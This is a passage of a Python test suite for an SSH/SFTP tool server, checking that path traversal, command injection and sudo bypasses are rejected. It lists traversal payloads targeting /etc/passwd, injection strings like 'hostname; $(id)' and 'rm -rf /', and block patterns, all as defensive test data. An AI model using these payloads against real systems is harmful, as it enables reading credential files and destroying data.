    "",                                    # empty path
    "relative/path",                       # not absolute
    "../etc/passwd",                       # parent traversal
    "/etc/../etc/passwd",                  # '..' component
    "/etc/./passwd",                       # '.' component
    "/home/user/..",                       # trailing '..'
    "/home/user/.",                        # trailing '.'
    "/%2e%2e/etc/passwd",                  # percent-encoded '..'
    "/etc/%2e%2e/passwd",                  # encoded '..' mid-path
    "/%2e%2e%2fetc%2fpasswd",              # fully encoded '../'
    "/etc/\x00passwd",                     # null byte
    "/etc/\u2215passwd",                   # division-slash homoglyph
    "/etc/\uff0fpasswd",                   # fullwidth-slash homoglyph
    "/~/etc/passwd",                       # tilde component
    "/home/~/passwd",                      # tilde mid-path
    "/a/b/c/../../../../etc/passwd",       # deep nesting
]


class TestPathTraversal:
    """Parametrized path-traversal tests against FileTransferService."""

    @pytest.mark.parametrize("remote_path", TRAVERSAL_PAYLOADS)
    def test_traversal_rejected(self, remote_path):
        """Traversal payloads must raise FileTransferError."""
        service = FileTransferService()
        with pytest.raises(FileTransferError):
            service._validate_path(remote_path)

    def test_valid_absolute_path_allowed(self):
        """A legitimate absolute path passes with the default '/' sandbox."""
        service = FileTransferService()
        assert service._validate_path("/etc/hosts") == "/etc/hosts"

    def test_path_inside_sandbox_allowed(self, tmp_path):
        """Paths inside a configured sandbox root are allowed."""
        service = FileTransferService(sandbox_root=str(tmp_path))
        allowed_path = str(tmp_path / "sub" / "file.txt")
        assert service._validate_path(allowed_path) == allowed_path

    def test_path_outside_sandbox_rejected(self, tmp_path):
        """Paths outside the sandbox root are rejected."""
        service = FileTransferService(sandbox_root=str(tmp_path))
        with pytest.raises(FileTransferError, match="outside the allowed sandbox"):
            service._validate_path("/etc/passwd")



# ---------------------------------------------------------------------------
# Authorization-bypass tests
# ---------------------------------------------------------------------------


class TestAuthorizationBypass:
    """Authorization-bypass attempts must all be rejected."""

    def test_embedded_sudo_with_sudo_true_rejected_by_validation(self):
        """sudo=True with 'sudo' embedded in the command fails validation."""
        error = SudoHandler.validate_sudo("sudo whoami", sudo=True)
        assert error is not None

    def test_embedded_sudo_blocked_by_pattern(self, tmp_path):
        """sudo=False with 'sudo whoami' is blocked by the \\bsudo\\b pattern."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b"],
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False

    def test_double_wrapping_prevented(self):
        """An already-wrapped command must not be wrapped again."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, "secret")
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} whoami"
        # Re-wrapping would nest sudo; validate_sudo rejects the wrapped form.
        assert SudoHandler.validate_sudo(wrapped, sudo=True) is not None

    def test_command_substitution_bypass_rejected(self, auth_manager):
        """Chained substitution is rejected via dangerous-patterns."""
        result = auth_manager.check_command("hostname; $(id)", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert result.matched_via == "blocked:dangerous-patterns"

    def test_case_insensitive_block_bypass_rejected(self, tmp_path):
        """Uppercased block-pattern commands are still blocked."""
        config = _make_minimal_config(
            block_patterns=[r"\bRM\s+-RF\b", r"\bShutdown\b"],
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        assert auth.check_command("rm -rf /", "testserver", "127.0.0.1").allowed is False
        assert auth.check_command("SHUTDOWN -H NOW", "testserver", "127.0.0.1").allowed is False

    def test_unknown_target_denied(self, auth_manager):
        """Commands for unknown targets are denied outright."""
        result = auth_manager.check_command("hostname", "nope", "127.0.0.1")
        assert result.allowed is False
        assert "Unknown target" in result.reason


# ---------------------------------------------------------------------------
# Sudo authorization tests
# ---------------------------------------------------------------------------


class TestSudoAuthorization:
    """Tests that authorization always runs against the unwrapped command."""

    def test_auth_checks_unwrapped_command(self, tmp_path):
        """When sudo=True, auth checks the original command, not 'sudo -S -p ...'."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
            block_patterns=[r"\bsudo\b"],
        )
        mgr = _make_config_manager(tmp_path, config)
        auth_mgr = AuthorizationManager(mgr)

        # The unwrapped command 'whoami' should be allowed
        result = auth_mgr.check_command("whoami", "testserver", "127.0.0.1")
        assert result.allowed is True

        # But 'sudo whoami' is blocked by pattern
        result = auth_mgr.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False


# ---------------------------------------------------------------------------
# Module-level tests
# ---------------------------------------------------------------------------


def test_sudo_validation_before_auth():
    """When sudo=True with 'sudo whoami', validation rejects before auth runs."""
    command = "sudo whoami"
    sudo = True

    if SudoHandler.validate_sudo(command, sudo) is not None:
        result = "ERROR_VALIDATION"
    else:
        result = "AUTH_RAN"

    assert result == "ERROR_VALIDATION"


# ---------------------------------------------------------------------------
# Graceful shutdown tests
# ---------------------------------------------------------------------------


class TestGracefulShutdown:
    """Tests for server._graceful_shutdown and its wiring through main()."""

    @staticmethod
    def _make_state(**overrides):
        """Build a SimpleNamespace with MagicMock runtime resources."""
        state = SimpleNamespace(
            ssh_executor=MagicMock(),
            config_manager=MagicMock(),
            ssh_connection_pool=MagicMock(),
            file_logger=MagicMock(),
            _shutdown_done=False,
        )
        for key, value in overrides.items():
            setattr(state, key, value)
        return state

    def test_releases_resources_in_dependency_order(self):
        """Drain executor -> stop watcher -> stop pool -> close log file LAST."""
        order = []

        def rec(name):
            def record(*_args, **_kwargs):
                order.append(name)

            return record

        executor = MagicMock()
        executor.shutdown.side_effect = rec("drain")
        config_manager = MagicMock()
        config_manager.stop_watcher.side_effect = rec("watcher")
        pool = MagicMock()
        pool.stop.side_effect = rec("pool")
        logger = MagicMock()
        logger.close.side_effect = rec("close-log")

        state = SimpleNamespace(
            ssh_executor=executor,
            config_manager=config_manager,
            ssh_connection_pool=pool,
            file_logger=logger,
            _shutdown_done=False,
        )

        server._graceful_shutdown(state, timeout=5.0)

        assert order == ["drain", "watcher", "pool", "close-log"]
        logger.close.assert_called_once()
        pool.stop.assert_called_once()
        config_manager.stop_watcher.assert_called_once()

    def test_is_idempotent(self):
        """A second shutdown call is a no-op thanks to the _shutdown_done guard."""
        state = self._make_state()
        server._graceful_shutdown(state, timeout=0.1)
        server._graceful_shutdown(state, timeout=0.1)
        state.ssh_executor.shutdown.assert_called()
        state.config_manager.stop_watcher.assert_called_once()
        state.ssh_connection_pool.stop.assert_called_once()
        state.file_logger.close.assert_called_once()

    def test_bounded_drain_force_cancels_stuck_work(self):
        """When the drain exceeds the timeout, pending work is force-cancelled."""
        release = threading.Event()

        def blocking_shutdown(*_args, **_kwargs):
            # Simulate in-flight SSH work that never finishes promptly.
            release.wait(timeout=2.0)

        executor = MagicMock()
        executor.shutdown.side_effect = blocking_shutdown
        state = self._make_state(ssh_executor=executor)

        server._graceful_shutdown(state, timeout=0.05)
        # Unblock the still-running worker thread to avoid cross-test noise.
        release.set()

        waited = any(
            call.kwargs.get("wait") is True
            for call in executor.shutdown.call_args_list
        )
        force = any(
            call.kwargs.get("wait") is False
            for call in executor.shutdown.call_args_list
        )
        assert waited is True
        assert force is True, "expected a force-cancel shutdown(wait=False)"

    def test_main_plumbs_graceful_run_server(self, monkeypatch):
        """main() wires create_app()'s app into _run_server for signal handling."""
        holder = {}

        config_manager = MagicMock()
        config_manager.data = {"settings": {"trusted_proxies": ["198.51.100.7"]}}

        fake_app = MagicMock()
        fake_app.state = SimpleNamespace(
            rate_limiter="limiter",
            trusted_proxies=["203.0.113.10"],
            config_manager=config_manager,
        )

        monkeypatch.setattr(server, "create_app", lambda **kwargs: fake_app)
        monkeypatch.setattr(
            server,
            "_run_server",
            lambda app, rate_limiter=None, trusted_proxies=None,
            trusted_proxies_provider=None: holder.update(
                app=app,
                rate_limiter=rate_limiter,
                trusted_proxies=trusted_proxies,
                trusted_proxies_provider=trusted_proxies_provider,
            ),
        )
        monkeypatch.setattr(sys, "argv", ["server.py"])
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        server.main()

        assert holder["app"] is fake_app
        assert holder["rate_limiter"] == "limiter"
        assert holder["trusted_proxies"] == ["203.0.113.10"]
        # The provider must read the LIVE (hot-reloaded) config manager value,
        # not the static startup snapshot.
        assert holder["trusted_proxies_provider"]() == ["198.51.100.7"]


# ---------------------------------------------------------------------------
# Handler-entry command sanitization tests
#
# These invoke the *real* ``ssh_execute_command`` tool handler (wired through
# ``_register_tools`` with controlled dependencies) and prove that the
# hander-entry ``command = sanitize_command(command)`` reassignment runs
# BEFORE sudo validation and the authorization check.
# ---------------------------------------------------------------------------


def _make_mock_ssh_client_manager(output: bytes = b"fake output"):
    """Return an (ssh_client_manager, client) pair with a canned exec_command."""
    stdout = MagicMock()
    stdout.read.return_value = output
    stdout.channel = MagicMock()
    stdout.channel.recv_exit_status.return_value = 0
    stderr = MagicMock()
    stderr.read.return_value = b""
    client = MagicMock()
    client.exec_command.return_value = (MagicMock(), stdout, stderr)
    cm = MagicMock()
    cm.__enter__.return_value = client
    manager = MagicMock()
    manager.connect.return_value = cm
    return manager, client


class _SyncExecutor:
    """A minimal executor that runs submitted callables inline.

    Avoids real thread-pool lifecycle (spawning/GC/shutdown) in tests that
    only need ``executor.submit(fn).result()`` to execute synchronously.
    """

    def submit(self, fn, /, *args, **kwargs):
        fut = MagicMock()
        fut.result.return_value = fn(*args, **kwargs)
        return fut

    def shutdown(self, *args, **kwargs):
        """No-op; nothing to shut down."""
        return None


class TestCommandSanitizationInHandler:
    """The handler sanitizes the command before sudo validation and auth."""

    @staticmethod
    def _wire_tool(tmp_path, config, monkeypatch, ssh_client_manager):
        """Register the real tool handler and return callables/spies."""
        mgr = _make_config_manager(tmp_path, config)
        auth_mgr = AuthorizationManager(mgr)
        auth_spy = MagicMock(wraps=auth_mgr.check_command)
        auth_mgr.check_command = auth_spy

        sudo_spy = MagicMock(wraps=SudoHandler.validate_sudo)
        monkeypatch.setattr(SudoHandler, "validate_sudo", sudo_spy)

        mcp = FastMCP("test")
        file_logger = MagicMock()
        stdlib_logger = MagicMock()
        file_transfer = MagicMock()
        executor = _SyncExecutor()

        server._register_tools(
            mcp,
            mgr,
            auth_mgr,
            file_logger,
            stdlib_logger,
            ssh_client_manager,
            file_transfer,
            "",  # ssh_key_path
            50000,  # max_command_output
            executor,
        )
        tool = asyncio.run(mcp.get_tool("ssh_execute_command"))
        return tool.fn, auth_spy, sudo_spy

    def test_null_bytes_stripped_before_sudo_and_auth(self, tmp_path, monkeypatch):
        """Null bytes are removed before sudo validation and the auth check."""
        config = _make_minimal_config()
        ssh_cm, _ = _make_mock_ssh_client_manager()
        fn, auth_spy, sudo_spy = self._wire_tool(
            tmp_path, config, monkeypatch, ssh_cm
        )

        fn(server_name="testserver", command="echo hello\x00world")

        # Handles the SSH path (auth denies 'echo', but the sanitized command
        # must have reached both the sudo validator and the auth manager).
        assert sudo_spy.call_args[0][0] == "echo helloworld"
        assert auth_spy.call_args.kwargs["command"] == "echo helloworld"

    def test_ansi_escape_stripped_in_handler(self, tmp_path, monkeypatch):
        """ANSI/ESC control characters are stripped before execution."""
        config = _make_minimal_config()
        ssh_cm, _ = _make_mock_ssh_client_manager()
        fn, auth_spy, sudo_spy = self._wire_tool(
            tmp_path, config, monkeypatch, ssh_cm
        )

        result = fn(
            server_name="testserver",
            command="\x1b[31mhostname\x1b[0m",
        )

        # The ESC control characters (\x1b) are stripped, leaving the plain
        # '[31m...' text.  The resulting 'command' is sanitized BEFORE the
        # auth check, so both the sudo validator and the auth manager see the
        # stripped form.  '[31mhostname[0m' is not allow-listed, so the call
        # is denied — but the ESC must never reach validation/auth.
        assert sudo_spy.call_args[0][0] == "[31mhostname[0m"
        assert auth_spy.call_args.kwargs["command"] == "[31mhostname[0m"
        assert "error" in json.loads(result)

    def test_fullwidth_homoglyph_sanitized_and_allowed(
        self, tmp_path, monkeypatch
    ):
        """Fullwidth homoglyphs are NFKC-normalised before auth."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["ls"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        ssh_cm, _ = _make_mock_ssh_client_manager()
        fn, auth_spy, sudo_spy = self._wire_tool(
            tmp_path, config, monkeypatch, ssh_cm
        )

        result = fn(server_name="testserver", command="ｌｓ ＼etc")

        # NFKC turns the fullwidth chars into plain 'ls \etc' (the fullwidth
        # reverse solidus U+FF3C normalises to a backslash U+005C).  'ls' is
        # allow-listed, so the sanitized command executes.
        assert sudo_spy.call_args[0][0] == "ls \\etc"
        assert auth_spy.call_args.kwargs["command"] == "ls \\etc"
        assert "fake output" in result

    def test_fullwidth_sudo_rejected_by_validation_before_auth(
        self, tmp_path, monkeypatch
    ):
        """Fullwidth 'sudo' is normalised by the handler entry, so sudo
        validation rejects it before the auth check runs."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["id"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        ssh_cm, _ = _make_mock_ssh_client_manager()
        fn, auth_spy, sudo_spy = self._wire_tool(
            tmp_path, config, monkeypatch, ssh_cm
        )

        result = fn(server_name="testserver", command="ｓｕｄｏ id", sudo=True)

        payload = json.loads(result)
        # validate_sudo sees the NFKC-normalised 'sudo id' and rejects it.
        assert sudo_spy.call_args[0][0] == "sudo id"
        assert sudo_spy.call_args[0][1] is True
        # The rejection happens at the handler entry, so auth never runs.
        assert auth_spy.call_count == 0
        assert payload["error"] is True


# ---------------------------------------------------------------------------
# SFTP config wiring (ticket #32)
# ---------------------------------------------------------------------------


class TestSftpConfigWiring:
    """Tests that SFTP settings are read from config and passed to FileTransferService."""

    def test_sftp_settings_read_from_config(self, tmp_path):
        """sandbox_root and max_path_length from config are read correctly."""
        config = _make_minimal_config(
            settings={
                "max_output_length": 50000,
                "command_timeout_max": 120,
                "sftp": {
                    "sandbox_root": "/home/app/sftp",
                    "max_path_length": 2048,
                },
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        sftp_settings = mgr.data.get("settings", {}).get("sftp", {})
        assert sftp_settings.get("sandbox_root") == "/home/app/sftp"
        assert sftp_settings.get("max_path_length") == 2048

    def test_sftp_settings_defaults_when_missing(self, tmp_path):
        """Missing sftp section falls back to sensible defaults."""
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)
        sftp_settings = mgr.data.get("settings", {}).get("sftp", {})
        assert sftp_settings.get("sandbox_root", "/") == "/"
        assert sftp_settings.get("max_path_length", 4096) == 4096

    def test_file_transfer_service_configured_from_settings(self, tmp_path):
        """FileTransferService receives config values from sftp settings."""
        config = _make_minimal_config(
            settings={
                "max_output_length": 50000,
                "command_timeout_max": 120,
                "sftp": {
                    "sandbox_root": "/tmp/sftp",
                    "max_path_length": 1024,
                },
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        sftp_settings = mgr.data.get("settings", {}).get("sftp", {})
        from lib.constants import DEFAULT_SFTP_SANDBOX_ROOT, DEFAULT_MAX_SFTP_PATH_LENGTH
        ft = FileTransferService(
            sandbox_root=sftp_settings.get("sandbox_root", DEFAULT_SFTP_SANDBOX_ROOT),
            max_path_length=sftp_settings.get("max_path_length", DEFAULT_MAX_SFTP_PATH_LENGTH),
        )
        assert "/tmp/sftp" in ft._sandbox_root
        assert ft.max_path_length == 1024

    def test_weak_upload_path_check_removed(self, tmp_path, monkeypatch):
        """The old startswith('/tmp/' or '/home/') check no longer blocks uploads.

        Previously, an upload to /opt/file.txt would be rejected with
        'Upload only allowed to /tmp/ or /home/ paths' even before _validate_path
        ran.  Now _validate_path is the single enforcement point and
        /opt/file.txt is accepted when the sandbox is '/' (the default).
        """
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)
        auth_mgr = AuthorizationManager(mgr)

        mcp = FastMCP("test")
        file_logger = MagicMock()
        stdlib_logger = MagicMock()

        # Use a real FileTransferService so _validate_path runs
        from lib.constants import DEFAULT_SFTP_SANDBOX_ROOT, DEFAULT_MAX_SFTP_PATH_LENGTH
        sftp_settings = mgr.data.get("settings", {}).get("sftp", {})
        ft = FileTransferService(
            sandbox_root=sftp_settings.get("sandbox_root", DEFAULT_SFTP_SANDBOX_ROOT),
            max_path_length=sftp_settings.get("max_path_length", DEFAULT_MAX_SFTP_PATH_LENGTH),
        )
        executor = _SyncExecutor()
        ssh_cm = MagicMock()
        ssh_cm.connect.return_value.__enter__ = MagicMock()
        ssh_cm.connect.return_value.__exit__ = MagicMock()

        server._register_tools(
            mcp,
            mgr,
            auth_mgr,
            file_logger,
            stdlib_logger,
            ssh_cm,
            ft,
            "",  # ssh_key_path
            50000,  # max_command_output
            executor,
        )
        tool = asyncio.run(mcp.get_tool("ssh_upload_file"))

        # Mock the SFTP open/put call to succeed
        mock_sftp = MagicMock()
        mock_ssh_client = MagicMock()
        mock_ssh_client.open_sftp.return_value = mock_sftp
        ssh_cm.connect.return_value.__enter__ = MagicMock(return_value=mock_ssh_client)

        # The old code would reject /opt/file.txt before even reaching SFTP.
        # Now it should pass path validation and reach the SFTP write.
        result = tool.fn(
            server_name="testserver",
            remote_path="/opt/file.txt",
            content="aGVsbG8=",
        )
        payload = json.loads(result)
        # Must NOT contain the old weak-path-check error
        assert "Upload only allowed to /tmp/ or /home/ paths" not in str(payload)


# ---------------------------------------------------------------------------
# ssh_check_connection MCP tool
# ---------------------------------------------------------------------------


class TestSshCheckConnection:
    """Tests for the ssh_check_connection MCP tool."""

    @staticmethod
    def _make_check_config(**target_overrides):
        """Create a config dict with a target that has a checkcommand."""
        return _make_minimal_config(
            **{
                "ssh_targets": {
                    "testbox": {
                        "host": "192.168.1.100",
                        "port": 22,
                        "username": "testuser",
                        "password": "testpass",
                        "checkcommand": "echo ping",
                        **target_overrides,
                    }
                },
            }
        )

    @staticmethod
    def _wire_tool(tmp_path, config, monkeypatch, ssh_client_manager=None):
        """Wire up the ssh_check_connection tool for testing."""
        mgr = _make_config_manager(tmp_path, config)
        auth_mgr = AuthorizationManager(mgr)

        mcp = FastMCP("test")
        file_logger = MagicMock()
        stdlib_logger = MagicMock()
        file_transfer = MagicMock()
        executor = _SyncExecutor()
        ssh_cm = ssh_client_manager or MagicMock()

        server._register_tools(
            mcp,
            mgr,
            auth_mgr,
            file_logger,
            stdlib_logger,
            ssh_cm,
            file_transfer,
            "",  # ssh_key_path
            50000,  # max_command_output
            executor,
        )
        tool = asyncio.run(mcp.get_tool("ssh_check_connection"))
        return tool.fn, file_logger

    def test_check_connection_success(self, tmp_path, monkeypatch):
        """Successful check returns success=True, output, exit_code, checkcommand."""
        config = self._make_check_config()
        ssh_cm, _client = _make_mock_ssh_client_manager(b"ping\n")
        fn, _logger = self._wire_tool(tmp_path, config, monkeypatch, ssh_cm)

        result = fn(server_name="testbox")
        payload = json.loads(result)

        assert payload["success"] is True
        assert payload["output"] == "ping"
        assert payload["exit_code"] == 0
        assert payload["checkcommand"] == "echo ping"

    def test_check_connection_auth_failure(self, tmp_path, monkeypatch):
        """Auth failure returns error with SSHAuthenticationError type."""
        config = self._make_check_config()
        ssh_cm = MagicMock()
        ssh_cm.connect.side_effect = SSHAuthenticationError("Auth failed")
        fn, _logger = self._wire_tool(tmp_path, config, monkeypatch, ssh_cm)

        result = fn(server_name="testbox")
        payload = json.loads(result)

        assert payload["error"] is True
        assert "SSHAuthenticationError" in payload["error_type"]

    def test_check_connection_timeout(self, tmp_path, monkeypatch):
        """Timeout returns error with SSHTimeoutError type."""
        config = self._make_check_config()
        ssh_cm = MagicMock()
        ssh_cm.connect.side_effect = SSHTimeoutError("Timed out")
        fn, _logger = self._wire_tool(tmp_path, config, monkeypatch, ssh_cm)

        result = fn(server_name="testbox")
        payload = json.loads(result)

        assert payload["error"] is True
        assert "SSHTimeoutError" in payload["error_type"]

    def test_check_connection_target_not_found(self, tmp_path, monkeypatch):
        """Unknown target name returns safe user_message, not internal details."""
        config = self._make_check_config()
        fn, _logger = self._wire_tool(tmp_path, config, monkeypatch)

        result = fn(server_name="nonexistent")
        payload = json.loads(result)

        assert payload["error"] is True
        assert payload["message"] == "SSH connection failed"

    def test_check_connection_default_checkcommand(self, tmp_path, monkeypatch):
        """Target without checkcommand uses DEFAULT_CHECK_COMMAND."""
        config = self._make_check_config()
        # Remove the checkcommand from the target
        del config["ssh_targets"]["testbox"]["checkcommand"]
        ssh_cm, _client = _make_mock_ssh_client_manager(b"pong\n")
        fn, _logger = self._wire_tool(tmp_path, config, monkeypatch, ssh_cm)

        result = fn(server_name="testbox")
        payload = json.loads(result)

        # Should use the default checkcommand
        assert payload["checkcommand"] == DEFAULT_CHECK_COMMAND

    def test_check_connection_log_entry(self, tmp_path, monkeypatch):
        """Log entry includes 'event': 'connection.check' and request metadata."""
        config = self._make_check_config()
        ssh_cm, _client = _make_mock_ssh_client_manager(b"pong\n")
        fn, file_logger = self._wire_tool(tmp_path, config, monkeypatch, ssh_cm)

        fn(server_name="testbox")

        # Find the connection.check log entry
        log_calls = [c for c in file_logger.log.call_args_list]
        check_entries = [
            c[0][0] for c in log_calls
            if isinstance(c[0][0], dict) and c[0][0].get("event") == "connection.check"
        ]
        assert len(check_entries) == 1
        entry = check_entries[0]
        assert entry["event"] == "connection.check"
        assert entry["target_name"] == "testbox"
        assert entry["command"] == "echo ping"
        assert "request_id" in entry
        assert "source_ip" in entry


# ---------------------------------------------------------------------------
# Catch-all exception sanitization (issue #8)
#
# The catch-all ``except Exception`` handlers must NOT leak internal details
# (file paths, connection strings, paramiko error text) to MCP clients.
# The actual exception is logged via file_logger and stdlib_logger for
# diagnostics, but the client sees only "Internal server error".
# ---------------------------------------------------------------------------


class TestCatchAllExceptionSanitization:
    """Catch-all handlers must sanitize exception details from MCP responses.

    Each tool handler's ``except Exception`` block must:
    1. Return ``"Internal server error"`` as the message (no raw exception text)
    2. Log the actual exception via ``file_logger.log`` with ``event: internal_error``
    3. Log via ``stdlib_logger.error`` for standard logging output
    """

    SENSITIVE_DETAIL = "secret path /home/user/.ssh/id_rsa"

    @staticmethod
    def _make_raising_ssh_manager():
        """Return an SSH client manager whose ``connect()`` raises a generic Exception."""
        manager = MagicMock()
        manager.connect.side_effect = Exception(
            TestCatchAllExceptionSanitization.SENSITIVE_DETAIL
        )
        return manager

    @staticmethod
    def _make_check_config(**target_overrides):
        """Create a config dict with a target that has a checkcommand."""
        return _make_minimal_config(
            **{
                "ssh_targets": {
                    "testbox": {
                        "host": "192.168.1.100",
                        "port": 22,
                        "username": "testuser",
                        "password": "testpass",
                        "checkcommand": "echo ping",
                        **target_overrides,
                    }
                },
            }
        )

    @staticmethod
    def _wire_tool(tmp_path, config, monkeypatch, tool_name, ssh_client_manager):
        """Register a tool handler and return (fn, file_logger, stdlib_logger)."""
        from lib.config import ConfigManager

        _write_config(tmp_path, config)
        mgr = ConfigManager(str(tmp_path))
        mgr.reload()
        auth_mgr = AuthorizationManager(mgr)

        mcp = FastMCP("test")
        file_logger = MagicMock()
        stdlib_logger = MagicMock()
        file_transfer = MagicMock()
        executor = _SyncExecutor()

        server._register_tools(
            mcp,
            mgr,
            auth_mgr,
            file_logger,
            stdlib_logger,
            ssh_client_manager,
            file_transfer,
            "",  # ssh_key_path
            50000,  # max_command_output
            executor,
        )
        tool = asyncio.run(mcp.get_tool(tool_name))
        return tool.fn, file_logger, stdlib_logger

    def test_execute_command_swallows_exception_details(self, tmp_path, monkeypatch):
        """ssh_execute_command catch-all must not leak exception text."""
        config = _make_minimal_config()
        ssh_cm = self._make_raising_ssh_manager()
        fn, file_logger, stdlib_logger = self._wire_tool(
            tmp_path, config, monkeypatch, "ssh_execute_command", ssh_cm
        )

        result = fn(server_name="testserver", command="hostname")
        payload = json.loads(result)

        # Must NOT leak the sensitive detail
        assert self.SENSITIVE_DETAIL not in payload.get("message", "")
        assert self.SENSITIVE_DETAIL not in str(payload)
        # Must return sanitized error
        assert payload["error"] is True
        assert payload["error_type"] == "MCPSSHError"
        assert payload["message"] == "An internal error occurred"

        # Must log the actual exception via file_logger
        error_entries = [
            c[0][0]
            for c in file_logger.log.call_args_list
            if isinstance(c[0][0], dict)
            and c[0][0].get("event") == "internal_error"
        ]
        assert len(error_entries) >= 1
        err_entry = error_entries[-1]
        assert err_entry["tool"] == "ssh_execute_command"
        assert err_entry["error_type"] == "Exception"
        assert err_entry["error_message"] == self.SENSITIVE_DETAIL
        assert err_entry["log_level"] == "ERROR"

        # Must log via stdlib_logger.error
        stdlib_logger.error.assert_called()
        error_call_args = str(stdlib_logger.error.call_args)
        assert "ssh_execute_command" in error_call_args

    def test_check_connection_swallows_exception_details(self, tmp_path, monkeypatch):
        """ssh_check_connection catch-all must not leak exception text."""
        config = self._make_check_config()
        ssh_cm = self._make_raising_ssh_manager()
        fn, file_logger, stdlib_logger = self._wire_tool(
            tmp_path, config, monkeypatch, "ssh_check_connection", ssh_cm
        )

        result = fn(server_name="testbox")
        payload = json.loads(result)

        assert self.SENSITIVE_DETAIL not in payload.get("message", "")
        assert self.SENSITIVE_DETAIL not in str(payload)
        assert payload["error"] is True
        assert payload["error_type"] == "MCPSSHError"
        assert payload["message"] == "An internal error occurred"

        error_entries = [
            c[0][0]
            for c in file_logger.log.call_args_list
            if isinstance(c[0][0], dict)
            and c[0][0].get("event") == "internal_error"
        ]
        assert len(error_entries) >= 1
        err_entry = error_entries[-1]
        assert err_entry["tool"] == "ssh_check_connection"
        assert err_entry["error_type"] == "Exception"
        assert err_entry["error_message"] == self.SENSITIVE_DETAIL

        stdlib_logger.error.assert_called()

    def test_download_file_swallows_exception_details(self, tmp_path, monkeypatch):
        """ssh_download_file catch-all must not leak exception text."""
        # download authorization checks for 'cat' — must be in allowed_commands
        config = _make_minimal_config(
            ssh_targets={
                "testbox": {
                    "host": "192.168.1.100",
                    "port": 22,
                    "username": "testuser",
                    "password": "testpass",
                    "checkcommand": "echo ping",
                },
            },
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["hostname", "uptime", "df", "cat"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        ssh_cm = self._make_raising_ssh_manager()
        fn, file_logger, stdlib_logger = self._wire_tool(
            tmp_path, config, monkeypatch, "ssh_download_file", ssh_cm
        )

        result = fn(server_name="testbox", remote_path="/tmp/test.txt")
        payload = json.loads(result)

        assert self.SENSITIVE_DETAIL not in payload.get("message", "")
        assert self.SENSITIVE_DETAIL not in str(payload)
        assert payload["error"] is True
        assert payload["error_type"] == "MCPSSHError"
        assert payload["message"] == "An internal error occurred"

        error_entries = [
            c[0][0]
            for c in file_logger.log.call_args_list
            if isinstance(c[0][0], dict)
            and c[0][0].get("event") == "internal_error"
        ]
        assert len(error_entries) >= 1
        err_entry = error_entries[-1]
        assert err_entry["tool"] == "ssh_download_file"
        assert err_entry["error_type"] == "Exception"
        assert err_entry["error_message"] == self.SENSITIVE_DETAIL

        stdlib_logger.error.assert_called()

    def test_upload_file_swallows_exception_details(self, tmp_path, monkeypatch):
        """ssh_upload_file catch-all must not leak exception text."""
        # upload authorization checks for 'tee' — must be in allowed_commands
        config = _make_minimal_config(
            ssh_targets={
                "testbox": {
                    "host": "192.168.1.100",
                    "port": 22,
                    "username": "testuser",
                    "password": "testpass",
                    "checkcommand": "echo ping",
                },
            },
            allowed_commands={
                "default": [
                    {"targets": ["*"], "commands": ["hostname", "uptime", "df", "tee"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        ssh_cm = self._make_raising_ssh_manager()
        fn, file_logger, stdlib_logger = self._wire_tool(
            tmp_path, config, monkeypatch, "ssh_upload_file", ssh_cm
        )

        result = fn(
            server_name="testbox",
            remote_path="/tmp/test.txt",
            content="hello",
        )
        payload = json.loads(result)

        assert self.SENSITIVE_DETAIL not in payload.get("message", "")
        assert self.SENSITIVE_DETAIL not in str(payload)
        assert payload["error"] is True
        assert payload["error_type"] == "MCPSSHError"
        assert payload["message"] == "An internal error occurred"

        error_entries = [
            c[0][0]
            for c in file_logger.log.call_args_list
            if isinstance(c[0][0], dict)
            and c[0][0].get("event") == "internal_error"
        ]
        assert len(error_entries) >= 1
        err_entry = error_entries[-1]
        assert err_entry["tool"] == "ssh_upload_file"
        assert err_entry["error_type"] == "Exception"
        assert err_entry["error_message"] == self.SENSITIVE_DETAIL

        stdlib_logger.error.assert_called()


class TestUserMessageSanitization:
    """``_format_error`` must use ``user_message`` instead of ``str(exc)``.

    Each ``MCPSSHError`` subclass carries a safe ``DEFAULT_USER_MESSAGE``
    that should appear in the ``message`` field of the structured error
    response.  The full internal detail (hostnames, ports, file paths,
    paramiko strings, commands) must NEVER leak through ``message``.

    These tests catch regressions if someone accidentally reverts to
    ``str(exc)`` inside ``_format_error``.
    """

    @staticmethod
    def _make_ssh_manager_raise(exc: Exception) -> MagicMock:
        """Return a mock SSH client manager whose ``connect()`` raises *exc*."""
        manager = MagicMock()
        manager.connect.side_effect = exc
        return manager

    @staticmethod
    def _wire_and_call(tmp_path, monkeypatch, config, ssh_cm, tool_name, **tool_kwargs):
        """Wire *tool_name*, call it, and return the parsed JSON payload."""
        from lib.config import ConfigManager

        _write_config(tmp_path, config)
        mgr = ConfigManager(str(tmp_path))
        mgr.reload()
        auth_mgr = AuthorizationManager(mgr)

        mcp = FastMCP("test")
        file_logger = MagicMock()
        stdlib_logger = MagicMock()
        file_transfer = MagicMock()
        executor = _SyncExecutor()

        server._register_tools(
            mcp,
            mgr,
            auth_mgr,
            file_logger,
            stdlib_logger,
            ssh_cm,
            file_transfer,
            "",  # ssh_key_path
            50000,  # max_command_output
            executor,
        )
